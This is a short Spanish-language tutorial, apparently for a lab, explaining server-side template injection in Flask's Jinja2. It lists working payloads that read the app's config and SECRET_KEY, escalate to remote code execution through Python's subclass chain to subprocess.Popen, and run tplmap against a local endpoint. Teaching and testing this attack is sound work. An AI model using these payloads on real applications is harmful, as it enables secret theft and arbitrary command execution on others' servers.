¿Qué es SSTI?

  1. Flask usa Jinja2 como motor de plantillas. Si el input del usuario se pasa directamente a render_template_string(), un atacante puede inyectar expresiones Jinja2.
  2. Prueba con una expresión matemática para confirmar la vulnerabilidad:
{{ "{{" }} 7*7 {{ "}}" }}          → 49
{{ "{{" }} config {{ "}}" }}       → configuración Flask
{{ "{{" }} config.SECRET_KEY {{ "}}" }}
  1. Escala al RCE (Remote Code Execution) recorriendo la cadena de objetos Python:
{{ "{{" }} ''.__class__.__mro__[1].__subclasses__() {{ "}}" }}
{{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate() {{ "}}" }}
  1. Busca el índice de subprocess.Popen en la lista de subclases e inyecta comandos arbitrarios.
  2. Con tplmap: tplmap -u "http://localhost:5000/ssti" --data "template=*"
